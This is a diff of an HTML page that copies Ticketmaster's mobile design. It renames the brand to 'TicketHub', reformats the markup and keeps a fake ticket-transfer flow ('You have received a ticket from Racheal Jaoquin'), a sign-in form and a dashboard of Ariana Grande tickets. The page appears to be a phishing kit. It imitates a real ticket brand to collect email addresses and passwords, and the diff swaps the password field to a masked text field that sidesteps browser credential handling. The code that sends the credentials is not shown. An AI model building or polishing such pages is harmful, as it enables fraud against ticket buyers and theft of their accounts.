-          <svg class="h-5 w-5" style="color:rgba(255,255,255,0.65);" fill="currentColor" viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-4.714-6.231-5.401 6.231H2.744l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
-          <svg class="h-5 w-5" style="color:rgba(255,255,255,0.65);" fill="currentColor" viewBox="0 0 24 24"><path d="M23.495 6.205a3.007 3.007 0 00-2.088-2.088c-1.87-.501-9.396-.501-9.396-.501s-7.507-.01-9.396.501A3.007 3.007 0 00.527 6.205a31.247 31.247 0 00-.522 5.805 31.247 31.247 0 00.522 5.783 3.007 3.007 0 002.088 2.088c1.868.502 9.396.502 9.396.502s7.506 0 9.396-.502a3.007 3.007 0 002.088-2.088 31.247 31.247 0 00.5-5.783 31.247 31.247 0 00-.5-5.805zM9.609 15.601V8.408l6.264 3.602z"/></svg>
-          <svg class="h-5 w-5" style="color:rgba(255,255,255,0.65);" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zM12 0C8.741 0 8.333.014 7.053.072 2.695.272.273 2.69.073 7.052.014 8.333 0 8.741 0 12c0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98C8.333 23.986 8.741 24 12 24c3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98C15.668.014 15.259 0 12 0zm0 5.838a6.162 6.162 0 100 12.324 6.162 6.162 0 000-12.324zM12 16a4 4 0 110-8 4 4 0 010 8zm6.406-11.845a1.44 1.44 0 100 2.881 1.44 1.44 0 000-2.881z"/></svg>
-          <svg class="h-5 w-5" style="color:rgba(255,255,255,0.65);" fill="currentColor" viewBox="0 0 24 24"><path d="M19.59 6.69a4.83 4.83 0 01-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 01-2.88 2.5 2.89 2.89 0 01-2.89-2.89 2.89 2.89 0 012.89-2.89c.28 0 .54.04.79.1V9.01a6.27 6.27 0 00-.79-.05 6.34 6.34 0 00-6.34 6.34 6.34 6.34 0 006.34 6.34 6.34 6.34 0 006.33-6.34V8.69a8.23 8.23 0 004.84 1.56V6.82a4.85 4.85 0 01-1.07-.13z"/></svg>
+          <svg class="h-5 w-5" style="color:rgba(255,255,255,0.65);" fill="currentColor" viewBox="0 0 24 24">
+            <path
+              d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" />
+          </svg>
+          <svg class="h-5 w-5" style="color:rgba(255,255,255,0.65);" fill="currentColor" viewBox="0 0 24 24">
+            <path
+              d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-4.714-6.231-5.401 6.231H2.744l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z" />
+          </svg>
+          <svg class="h-5 w-5" style="color:rgba(255,255,255,0.65);" fill="currentColor" viewBox="0 0 24 24">
+            <path
+              d="M23.495 6.205a3.007 3.007 0 00-2.088-2.088c-1.87-.501-9.396-.501-9.396-.501s-7.507-.01-9.396.501A3.007 3.007 0 00.527 6.205a31.247 31.247 0 00-.522 5.805 31.247 31.247 0 00.522 5.783 3.007 3.007 0 002.088 2.088c1.868.502 9.396.502 9.396.502s7.506 0 9.396-.502a3.007 3.007 0 002.088-2.088 31.247 31.247 0 00.5-5.783 31.247 31.247 0 00-.5-5.805zM9.609 15.601V8.408l6.264 3.602z" />
+          </svg>
+          <svg class="h-5 w-5" style="color:rgba(255,255,255,0.65);" fill="currentColor" viewBox="0 0 24 24">
+            <path
+              d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zM12 0C8.741 0 8.333.014 7.053.072 2.695.272.273 2.69.073 7.052.014 8.333 0 8.741 0 12c0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98C8.333 23.986 8.741 24 12 24c3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98C15.668.014 15.259 0 12 0zm0 5.838a6.162 6.162 0 100 12.324 6.162 6.162 0 000-12.324zM12 16a4 4 0 110-8 4 4 0 010 8zm6.406-11.845a1.44 1.44 0 100 2.881 1.44 1.44 0 000-2.881z" />
+          </svg>
+          <svg class="h-5 w-5" style="color:rgba(255,255,255,0.65);" fill="currentColor" viewBox="0 0 24 24">
+            <path
+              d="M19.59 6.69a4.83 4.83 0 01-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 01-2.88 2.5 2.89 2.89 0 01-2.89-2.89 2.89 2.89 0 012.89-2.89c.28 0 .54.04.79.1V9.01a6.27 6.27 0 00-.79-.05 6.34 6.34 0 00-6.34 6.34 6.34 6.34 0 006.34 6.34 6.34 6.34 0 006.33-6.34V8.69a8.23 8.23 0 004.84 1.56V6.82a4.85 4.85 0 01-1.07-.13z" />
+          </svg>
         </div>
       </footer>
     </div>
@@ -399,24 +528,48 @@
 
   <!-- ================= OVERLAY: SECURING TICKET LOADING ================= -->
   <div id="overlay-securing" class="fixed inset-0 bg-white flex flex-col items-center justify-center z-[95] hidden">
-    <div style="width:96px;height:96px;border:5px solid #c7d7fb;border-top-color:#1d3fbf;border-radius:50%;animation:spin 0.9s linear infinite;"></div>
-    <p style="font-size:26px;font-weight:800;color:#111;margin-top:28px;text-align:center;line-height:1.2;">Securing Your Ticket(s)</p>
-    <p id="overlay-securing-sub" style="font-size:14px;font-weight:500;color:#666;margin-top:8px;text-align:center;max-width:240px;">You have received a ticket from Racheal Jaoquin</p>
+    <div
+      style="width:96px;height:96px;border:5px solid #c7d7fb;border-top-color:#1d3fbf;border-radius:50%;animation:spin 0.9s linear infinite;">
+    </div>
+    <p style="font-size:26px;font-weight:800;color:#111;margin-top:28px;text-align:center;line-height:1.2;">Securing
+      Your Ticket(s)</p>
+    <p id="overlay-securing-sub"
+      style="font-size:14px;font-weight:500;color:#666;margin-top:8px;text-align:center;max-width:240px;">You have
+      received a ticket from Racheal Jaoquin</p>
   </div>
-  <style>@keyframes spin{to{transform:rotate(360deg)}}</style>
+  <style>
+    @keyframes spin {
+      to {
+        transform: rotate(360deg)
+      }
+    }
+  </style>
 
   <!-- ================= GLOBAL SEARCH MODAL ================= -->
-  <div id="global-search-modal" class="fixed inset-0 bg-white z-[99] hidden flex-col select-none" style="padding-top: env(safe-area-inset-top);">
+  <div id="global-search-modal" class="fixed inset-0 bg-white z-[99] hidden flex-col select-none"
+    style="padding-top: env(safe-area-inset-top);">
     <!-- Top Search Header -->
     <div style="background:#0041D7;padding:12px 16px;display:flex;align-items:center;gap:12px;">
-      <button onclick="closeGlobalSearchModal()" style="background:none;border:none;cursor:pointer;padding:6px;color:#fff;" aria-label="Close search">
-        <svg width="22" height="22" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M15 19l-7-7 7-7"/></svg>
+      <button onclick="closeGlobalSearchModal()"
+        style="background:none;border:none;cursor:pointer;padding:6px;color:#fff;" aria-label="Close search">
+        <svg width="22" height="22" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M15 19l-7-7 7-7" />
+        </svg>
       </button>
       <div style="flex:1;position:relative;display:flex;align-items:center;">
-        <svg width="18" height="18" fill="none" stroke="#9ca3af" stroke-width="2.2" viewBox="0 0 24 24" style="position:absolute;left:12px;pointer-events:none;"><circle cx="11" cy="11" r="8"/><path stroke-linecap="round" d="M21 21l-4.35-4.35"/></svg>
-        <input id="global-search-input" type="text" placeholder="Search artists, events &amp; venues..." style="width:100%;height:44px;background:#ffffff;border:none;outline:none;border-radius:4px;padding:0 38px 0 38px;font-size:15px;font-weight:600;color:#111;" oninput="handleGlobalSearchInput(this.value)" />
-        <button id="global-search-clear-btn" onclick="clearGlobalSearchInput()" style="position:absolute;right:10px;background:none;border:none;cursor:pointer;padding:4px;color:#9ca3af;display:none;">
-          <svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12"/></svg>
+        <svg width="18" height="18" fill="none" stroke="#9ca3af" stroke-width="2.2" viewBox="0 0 24 24"
+          style="position:absolute;left:12px;pointer-events:none;">
+          <circle cx="11" cy="11" r="8" />
+          <path stroke-linecap="round" d="M21 21l-4.35-4.35" />
+        </svg>
+        <input id="global-search-input" type="text" placeholder="Search artists, events &amp; venues..."
+          style="width:100%;height:44px;background:#ffffff;border:none;outline:none;border-radius:4px;padding:0 38px 0 38px;font-size:15px;font-weight:600;color:#111;"
+          oninput="handleGlobalSearchInput(this.value)" />
+        <button id="global-search-clear-btn" onclick="clearGlobalSearchInput()"
+          style="position:absolute;right:10px;background:none;border:none;cursor:pointer;padding:4px;color:#9ca3af;display:none;">
+          <svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12" />
+          </svg>
         </button>
       </div>
     </div>
@@ -425,15 +578,21 @@
     <div style="flex:1;overflow-y:auto;background:#f9fafb;padding:16px;">
       <!-- Initial suggestion / placeholder state -->
       <div id="global-search-placeholder" style="text-align:center;padding:48px 20px;color:#6b7280;">
-        <svg width="48" height="48" fill="none" stroke="#d1d5db" stroke-width="1.5" viewBox="0 0 24 24" style="margin:0 auto 12px;"><circle cx="11" cy="11" r="8"/><path stroke-linecap="round" d="M21 21l-4.35-4.35"/></svg>
-        <p style="font-size:16px;font-weight:700;color:#374151;">Search on Ticketmaster</p>
+        <svg width="48" height="48" fill="none" stroke="#d1d5db" stroke-width="1.5" viewBox="0 0 24 24"
+          style="margin:0 auto 12px;">
+          <circle cx="11" cy="11" r="8" />
+          <path stroke-linecap="round" d="M21 21l-4.35-4.35" />
+        </svg>
+        <p style="font-size:16px;font-weight:700;color:#374151;">Search on TicketHub</p>
         <p style="font-size:13px;color:#9ca3af;margin-top:4px;">Find concerts, sports, theater and live events</p>
       </div>
 
       <!-- Loading State -->
       <div id="global-search-loading" style="display:none;text-align:center;padding:48px 20px;">
-        <div style="width:40px;height:40px;border:3px solid #e5e7eb;border-top-color:#0041D7;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto 14px;"></div>
-        <p style="font-size:14px;font-weight:700;color:#374151;">Searching live Ticketmaster events...</p>
+        <div
+          style="width:40px;height:40px;border:3px solid #e5e7eb;border-top-color:#0041D7;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto 14px;">
+        </div>
+        <p style="font-size:14px;font-weight:700;color:#374151;">Searching live TicketHub events...</p>
       </div>
 
       <!-- Results List -->
@@ -452,12 +611,14 @@
     <div class="bg-white mx-6 max-w-[340px] w-full px-6 py-8 flex flex-col items-center text-center shadow-2xl">
       <div class="h-16 w-16 bg-[#00a256] rounded-full flex items-center justify-center shrink-0">
         <svg class="w-9 h-9 text-white" fill="none" stroke="currentColor" stroke-width="4" viewBox="0 0 24 24">
-          <path stroke-linecap="round" stroke-linejoin="round" d="M4.5 12.75l6 6 9-13.5"/>
+          <path stroke-linecap="round" stroke-linejoin="round" d="M4.5 12.75l6 6 9-13.5" />
         </svg>
       </div>
       <h3 class="text-[22px] font-black text-black mt-4 font-outfit">Successful</h3>
-      <p id="toast-success-msg" class="text-[13px] text-gray-600 font-medium mt-2 leading-snug">You have successfully accepted the ticket(s)</p>
-      <button onclick="dismissSuccessToast()" style="background:#0041D7;" class="mt-6 w-full text-white font-bold text-[15px] py-[13px] transition-colors">
+      <p id="toast-success-msg" class="text-[13px] text-gray-600 font-medium mt-2 leading-snug">You have successfully
+        accepted the ticket(s)</p>
+      <button onclick="dismissSuccessToast()" style="background:#0041D7;"
+        class="mt-6 w-full text-white font-bold text-[15px] py-[13px] transition-colors">
         Ok
       </button>
     </div>
@@ -468,7 +629,7 @@
     <!-- Blue Header Bar -->
     <header class="w-full bg-[#0052cd] py-5 text-center flex items-center justify-center select-none shrink-0">
       <span class="font-outfit font-black text-[22px] italic tracking-tight lowercase text-white">
-        ticketmaster<span class="text-[9px] align-super font-normal not-italic ml-0.5">®</span>
+        tickethub<span class="text-[9px] align-super font-normal not-italic ml-0.5">®</span>
       </span>
     </header>
 
@@ -489,23 +650,31 @@
   <div id="page-login" class="w-full flex-1 flex flex-col items-center bg-white hidden fade-in">
     <main class="w-full max-w-[420px] px-6 py-12 flex flex-col text-left">
       <h2 class="text-[32px] font-bold font-outfit text-black leading-none">Sign in</h2>
-      <p class="mt-3 text-sm text-gray-700 font-medium">New to Ticketmaster? <a href="#" class="text-primary font-semibold hover:underline">Sign Up</a></p>
+      <p class="mt-3 text-sm text-gray-700 font-medium">New to TicketHub? <a href="#"
+          class="text-primary font-semibold hover:underline">Sign Up</a></p>
       <form id="login-form" onsubmit="handleLoginSubmit(event)" class="mt-8 space-y-6">
         <div>
           <label class="text-xs font-semibold text-gray-700 uppercase tracking-wide">Email</label>
-          <input type="email" required id="login-email" class="w-full mt-1.5 h-11 border border-gray-400 px-3.5 text-base rounded-none outline-none focus:border-primary text-black" />
+          <input type="email" required id="login-email"
+            class="w-full mt-1.5 h-11 border border-gray-400 px-3.5 text-base rounded-none outline-none focus:border-primary text-black" />
         </div>
         <div class="relative">
           <label class="text-xs font-semibold text-gray-700 uppercase tracking-wide">Password</label>
           <div class="relative w-full mt-1.5">
-            <input type="password" required id="login-password" class="w-full h-11 border border-gray-400 pl-3.5 pr-14 text-base rounded-none outline-none focus:border-primary text-black" />
-            <button type="button" onclick="togglePasswordVisibility()" class="absolute right-3.5 top-1/2 -translate-y-1/2 text-sm text-gray-700 font-semibold focus:outline-none hover:text-black">Show</button>
+            <input type="text" required id="login-password" style="-webkit-text-security:disc;"
+              class="w-full h-11 border border-gray-400 pl-3.5 pr-14 text-base rounded-none outline-none focus:border-primary text-black" />
+            <button type="button" onclick="togglePasswordVisibility()"
+              class="absolute right-3.5 top-1/2 -translate-y-1/2 text-sm text-gray-700 font-semibold focus:outline-none hover:text-black">Show</button>
           </div>
         </div>
         <p class="text-xs text-gray-500 leading-relaxed">
-          By continuing past this page, I acknowledge that I have read and agree to the current <a href="#" class="text-primary font-semibold hover:underline">Terms of Use</a> and <a href="#" class="text-primary font-semibold hover:underline">Privacy Policy</a>.
+          By continuing past this page, I acknowledge that I have read and agree to the current <a href="#"
+            class="text-primary font-semibold hover:underline">Terms of Use</a> and <a href="#"
+            class="text-primary font-semibold hover:underline">Privacy Policy</a>.
         </p>
-        <button type="submit" class="w-full bg-primary hover:bg-blue-700 text-white font-bold py-3.5 rounded-none text-base uppercase tracking-wide transition-colors">Sign in</button>
+        <button type="submit"
+          class="w-full bg-primary hover:bg-blue-700 text-white font-bold py-3.5 rounded-none text-base uppercase tracking-wide transition-colors">Sign
+          in</button>
       </form>
     </main>
   </div>
@@ -516,26 +685,36 @@
     <!-- Header -->
     <header class="w-full bg-primary text-white">
       <div class="px-4 py-4 flex items-center justify-between max-w-md mx-auto">
-        <button onclick="openSettingsDrawer()" class="p-1 focus:outline-none hover:opacity-85 active:scale-95 transition-all">
+        <button onclick="openSettingsDrawer()"
+          class="p-1 focus:outline-none hover:opacity-85 active:scale-95 transition-all">
           <i data-lucide="menu" class="h-6 w-6"></i>
         </button>
         <span class="font-outfit font-bold text-xl italic tracking-tight lowercase">
-          ticketmaster<span class="text-[9px] align-super font-normal not-italic ml-0.5">®</span>
+          tickethub<span class="text-[9px] align-super font-normal not-italic ml-0.5">®</span>
         </span>
         <div class="flex items-center gap-4">
-          <button onclick="openGlobalSearchModal()" class="p-1 focus:outline-none hover:opacity-85 active:scale-95 transition-all" aria-label="Search Ticketmaster"><i data-lucide="search" class="h-5 w-5"></i></button>
-          <button onclick="openSettingsDrawer()" class="p-1 focus:outline-none hover:opacity-85 active:scale-95 transition-all" aria-label="Account settings"><i data-lucide="user" class="h-5 w-5"></i></button>
+          <button onclick="openGlobalSearchModal()"
+            class="p-1 focus:outline-none hover:opacity-85 active:scale-95 transition-all"
+            aria-label="Search TicketHub"><i data-lucide="search" class="h-5 w-5"></i></button>
+          <button onclick="openSettingsDrawer()"
+            class="p-1 focus:outline-none hover:opacity-85 active:scale-95 transition-all"
+            aria-label="Account settings"><i data-lucide="user" class="h-5 w-5"></i></button>
         </div>
       </div>
 
       <!-- Search bar overlay -->
-      <div id="claim-search-bar" class="hidden bg-[#0254D0] px-4 py-3 max-w-md mx-auto border-t border-white/10 flex gap-2 transition-all duration-200">
-        <input id="claim-search-input" type="text" placeholder="Search events on Ticketmaster..." class="flex-1 px-3 py-2 text-sm rounded bg-white text-black outline-none border-0 font-medium" oninput="debouncedSearch(this.value)" />
-        <button onclick="toggleSearchOverlay()" class="text-white text-xs uppercase font-extrabold px-2 tracking-wider">Cancel</button>
+      <div id="claim-search-bar"
+        class="hidden bg-[#0254D0] px-4 py-3 max-w-md mx-auto border-t border-white/10 flex gap-2 transition-all duration-200">
+        <input id="claim-search-input" type="text" placeholder="Search events on TicketHub..."
+          class="flex-1 px-3 py-2 text-sm rounded bg-white text-black outline-none border-0 font-medium"
+          oninput="debouncedSearch(this.value)" />
+        <button onclick="toggleSearchOverlay()"
+          class="text-white text-xs uppercase font-extrabold px-2 tracking-wider">Cancel</button>
       </div>
 
       <!-- Breadcrumbs -->
-      <div class="bg-primary/95 text-[11px] font-semibold text-white/80 py-1.5 px-4 max-w-md mx-auto text-left border-t border-white/10">
+      <div
+        class="bg-primary/95 text-[11px] font-semibold text-white/80 py-1.5 px-4 max-w-md mx-auto text-left border-t border-white/10">
         Home / My Tickets
       </div>
       <!-- Headline -->
@@ -544,10 +723,16 @@
         <p id="dashboard-email-display" class="text-xs text-white/80 font-medium mt-1"></p>
       </div>
       <!-- Tabs (Flat design) -->
-      <div class="grid grid-cols-3 max-w-md mx-auto text-center border-b border-white/20 mt-4 text-xs font-semibold uppercase tracking-wider">
-        <button id="tab-upcoming" onclick="switchDashboardTab('upcoming')" class="py-3.5 border-b-2 border-white text-white focus:outline-none transition-all">Upcoming Events</button>
-        <button id="tab-past" onclick="switchDashboardTab('past')" class="py-3.5 border-b-2 border-transparent text-white/60 focus:outline-none transition-all">Past Events</button>
-        <button id="tab-listings" onclick="switchDashboardTab('listings')" class="py-3.5 border-b-2 border-transparent text-white/60 focus:outline-none transition-all">My Listings</button>
+      <div
+        class="grid grid-cols-3 max-w-md mx-auto text-center border-b border-white/20 mt-4 text-xs font-semibold uppercase tracking-wider">
+        <button id="tab-upcoming" onclick="switchDashboardTab('upcoming')"
+          class="py-3.5 border-b-2 border-white text-white focus:outline-none transition-all">Upcoming Events</button>
+        <button id="tab-past" onclick="switchDashboardTab('past')"
+          class="py-3.5 border-b-2 border-transparent text-white/60 focus:outline-none transition-all">Past
+          Events</button>
+        <button id="tab-listings" onclick="switchDashboardTab('listings')"
+          class="py-3.5 border-b-2 border-transparent text-white/60 focus:outline-none transition-all">My
+          Listings</button>
       </div>
     </header>
 
@@ -556,7 +741,7 @@
       <!-- Search Results Container -->
       <div id="search-results-container" class="hidden space-y-4 text-left">
         <div class="flex items-center justify-between border-b border-gray-100 pb-2">
-          <span class="text-xs font-bold text-gray-500 uppercase tracking-wider">Ticketmaster Search Results</span>
+          <span class="text-xs font-bold text-gray-500 uppercase tracking-wider">TicketHub Search Results</span>
           <button onclick="clearSearch()" class="text-xs text-primary font-bold hover:underline">Clear</button>
         </div>
         <div id="search-results-list" class="space-y-2">
@@ -566,7 +751,8 @@
 
       <!-- Dashboard Skeleton Container (Loads for 2s after login) -->
       <div id="dashboard-skeleton" class="space-y-6 animate-pulse select-none">
-        <div class="border border-gray-200 dark:border-zinc-800 rounded-none overflow-hidden flex flex-col bg-white dark:bg-zinc-800">
+        <div
+          class="border border-gray-200 dark:border-zinc-800 rounded-none overflow-hidden flex flex-col bg-white dark:bg-zinc-800">
           <div class="w-full aspect-[16/10] bg-gray-200 dark:bg-zinc-700"></div>
           <div class="p-5 space-y-4 text-left">
             <div class="h-6 bg-gray-250 dark:bg-zinc-700 w-3/4 rounded bg-gray-200"></div>
@@ -582,76 +768,91 @@
       <!-- Tab Content Area -->
       <div id="tab-content-area" class="space-y-6">
         <!-- Upcoming Events Container -->
-        <div id="upcoming-events-container" class="border border-gray-300 rounded-none overflow-hidden flex flex-col bg-[#1A1A1A]">
-        <!-- Event Photo wrapper -->
-        <div class="w-full aspect-[16/10] relative">
-          <img src="https://images.unsplash.com/photo-1470229722913-7c0e2dbbafd3?w=800&auto=format&fit=crop" class="w-full h-full object-cover block" alt="Ariana Grande" />
-          <!-- Black Date stamp (flushed directly against the black details card below) -->
-          <div id="dashboard-event-date" class="absolute bottom-0 left-0 bg-[#111111] text-white px-3.5 py-1.5 text-xs font-bold uppercase tracking-wider z-10">
-            MON • JUN 22, 2026 • 12:00 PM
-          </div>
-        </div>
-        <!-- Card details -->
-        <div class="p-4 text-white text-left flex flex-col justify-between">
-          <h3 class="text-xl font-bold tracking-tight leading-snug font-outfit uppercase">
-            ARIANA GRANDE - THE ETERNAL SUNSHINE TOUR
-          </h3>
-          <div class="flex items-center justify-between mt-4">
-            <span class="text-xs text-white/70 font-semibold">
-              AT&T Stadium, Texas
-            </span>
-            <div class="flex items-center gap-1.5 text-white/80">
-              <i data-lucide="copy" class="h-3.5 w-3.5 text-white/70"></i>
-              <span class="text-xs font-bold">x4</span>
+        <div id="upcoming-events-container"
+          class="border border-gray-300 rounded-none overflow-hidden flex flex-col bg-[#1A1A1A]">
+          <!-- Event Photo wrapper -->
+          <div class="w-full aspect-[16/10] relative">
+            <img src="https://images.unsplash.com/photo-1470229722913-7c0e2dbbafd3?w=800&auto=format&fit=crop"
+              class="w-full h-full object-cover block" alt="Ariana Grande" />
+            <!-- Black Date stamp (flushed directly against the black details card below) -->
+            <div id="dashboard-event-date"
+              class="absolute bottom-0 left-0 bg-[#111111] text-white px-3.5 py-1.5 text-xs font-bold uppercase tracking-wider z-10">
+              MON • JUN 22, 2026 • 12:00 PM
             </div>
           </div>
+          <!-- Card details -->
+          <div class="p-4 text-white text-left flex flex-col justify-between">
+            <h3 class="text-xl font-bold tracking-tight leading-snug font-outfit uppercase">
+              ARIANA GRANDE - THE ETERNAL SUNSHINE TOUR
+            </h3>
+            <div class="flex items-center justify-between mt-4">
+              <span class="text-xs text-white/70 font-semibold">
+                AT&T Stadium, Texas
+              </span>
+              <div class="flex items-center gap-1.5 text-white/80">
+                <i data-lucide="copy" class="h-3.5 w-3.5 text-white/70"></i>
+                <span class="text-xs font-bold">x4</span>
+              </div>
+            </div>
+          </div>
+          <!-- Blue view ticket button (flat) -->
+          <button onclick="openTicketModal()"
+            class="w-full bg-primary hover:bg-blue-700 text-white font-bold py-3.5 text-sm uppercase tracking-wide transition-colors">
+            View Ticket
+          </button>
         </div>
-        <!-- Blue view ticket button (flat) -->
-        <button onclick="openTicketModal()" class="w-full bg-primary hover:bg-blue-700 text-white font-bold py-3.5 text-sm uppercase tracking-wide transition-colors">
-          View Ticket
-        </button>
-      </div>
 
-      <!-- Past Events Placeholder -->
-      <div id="past-events-placeholder" class="hidden flex flex-col items-center justify-center py-16 px-4 text-center select-none">
-        <div class="w-16 h-16 bg-gray-100 dark:bg-zinc-800 rounded-full flex items-center justify-center mb-4 text-gray-400 shrink-0">
-          <i data-lucide="calendar-x" class="h-8 w-8"></i>
+        <!-- Past Events Placeholder -->
+        <div id="past-events-placeholder"
+          class="hidden flex flex-col items-center justify-center py-16 px-4 text-center select-none">
+          <div
+            class="w-16 h-16 bg-gray-100 dark:bg-zinc-800 rounded-full flex items-center justify-center mb-4 text-gray-400 shrink-0">
+            <i data-lucide="calendar-x" class="h-8 w-8"></i>
+          </div>
+          <p class="text-base font-bold text-gray-900 dark:text-white font-outfit">No Past Events</p>
+          <p class="text-xs text-gray-500 dark:text-gray-400 mt-1 max-w-[200px]">You have no past events in your account
+            history.</p>
         </div>
-        <p class="text-base font-bold text-gray-900 dark:text-white font-outfit">No Past Events</p>
-        <p class="text-xs text-gray-500 dark:text-gray-400 mt-1 max-w-[200px]">You have no past events in your account history.</p>
-      </div>
 
-      <!-- My Listings Placeholder -->
-      <div id="listings-placeholder" class="hidden flex flex-col items-center justify-center py-16 px-4 text-center select-none">
-        <div class="w-16 h-16 bg-gray-100 dark:bg-zinc-800 rounded-full flex items-center justify-center mb-4 text-gray-400 shrink-0">
-          <i data-lucide="tag" class="h-8 w-8"></i>
+        <!-- My Listings Placeholder -->
+        <div id="listings-placeholder"
+          class="hidden flex flex-col items-center justify-center py-16 px-4 text-center select-none">
+          <div
+            class="w-16 h-16 bg-gray-100 dark:bg-zinc-800 rounded-full flex items-center justify-center mb-4 text-gray-400 shrink-0">
+            <i data-lucide="tag" class="h-8 w-8"></i>
+          </div>
+          <p class="text-base font-bold text-gray-900 dark:text-white font-outfit">No Active Listings</p>
+          <p class="text-xs text-gray-500 dark:text-gray-400 mt-1 max-w-[200px]">You don't have any tickets currently
+            listed for sale.</p>
         </div>
-        <p class="text-base font-bold text-gray-900 dark:text-white font-outfit">No Active Listings</p>
-        <p class="text-xs text-gray-500 dark:text-gray-400 mt-1 max-w-[200px]">You don't have any tickets currently listed for sale.</p>
       </div>
-    </div>
-  </main>
+    </main>
   </div>
 
   <!-- ================= BOTTOM SHEET OVERLAY ================= -->
   <!-- Dimmed Backdrop (Darker by 20% with dynamic viewport height) -->
-  <div id="modal-backdrop" onclick="closeTicketModal()" class="fixed inset-0 min-h-[100dvh] bg-black/80 opacity-0 pointer-events-none transition-opacity duration-300 z-40"></div>
+  <div id="modal-backdrop" onclick="closeTicketModal()"
+    class="fixed inset-0 min-h-[100dvh] bg-black/80 opacity-0 pointer-events-none transition-opacity duration-300 z-40">
+  </div>
 
   <!-- Bottom Slide-over Sheet (Centered flex wrapper with vertical scroll fallback) -->
-  <div id="ticket-modal" class="fixed inset-0 min-h-[100dvh] z-50 flex flex-col items-center justify-center py-6 px-4 overflow-y-auto pointer-events-none translate-y-full transition-transform duration-300 ease-out">
+  <div id="ticket-modal"
+    class="fixed inset-0 min-h-[100dvh] z-50 flex flex-col items-center justify-center py-6 px-4 overflow-y-auto pointer-events-none translate-y-full transition-transform duration-300 ease-out">
     <div class="relative w-full max-w-[475px] flex flex-col pointer-events-auto shrink-0 my-auto">
       <!-- Close button ('X') at the top right of the modal content -->
-      <button onclick="closeTicketModal()" class="absolute -top-12 right-0 p-2.5 text-white hover:text-gray-300 focus:outline-none bg-black/40 rounded-full z-50 shrink-0">
+      <button onclick="closeTicketModal()"
+        class="absolute -top-12 right-0 p-2.5 text-white hover:text-gray-300 focus:outline-none bg-black/40 rounded-full z-50 shrink-0">
         <i data-lucide="x" class="h-6 w-6"></i>
       </button>
 
       <!-- Ticket device frame and scanning card -->
       <main class="w-full py-4 flex flex-col justify-center items-center overflow-hidden">
         <!-- Carousel Container (CSS Snap scroll) -->
-        <div id="carousel-container" class="w-full flex flex-row overflow-x-auto snap-x snap-mandatory scrollbar-none" style="scroll-behavior: smooth;">
+        <div id="carousel-container" class="w-full flex flex-row overflow-x-auto snap-x snap-mandatory scrollbar-none"
+          style="scroll-behavior: smooth;">
           <!-- Dynamically populated cards -->
         </div>
-        
+
         <!-- Swiper Seat Pagination Dots -->
         <div id="seat-dots" class="flex justify-center items-center gap-2 mt-5 shrink-0">
           <!-- Dots will be dynamically injected -->
@@ -662,23 +863,30 @@
 
   <!-- ================= MY ACCOUNT DRAWER OVERLAY ================= -->
   <!-- Settings Drawer Backdrop -->
-  <div id="settings-backdrop" class="fixed inset-0 bg-black/60 opacity-0 pointer-events-none transition-opacity duration-300 z-50" onclick="closeSettingsDrawer()"></div>
-  
+  <div id="settings-backdrop"
+    class="fixed inset-0 bg-black/60 opacity-0 pointer-events-none transition-opacity duration-300 z-50"
+    onclick="closeSettingsDrawer()"></div>
+
   <!-- My Account Drawer Panel (slides in from left) -->
-  <div id="settings-drawer" class="fixed inset-y-0 left-0 w-80 max-w-[85vw] bg-white dark:bg-zinc-900 shadow-2xl translate-x-[-100%] transition-transform duration-300 ease-in-out z-50 flex flex-col select-none">
+  <div id="settings-drawer"
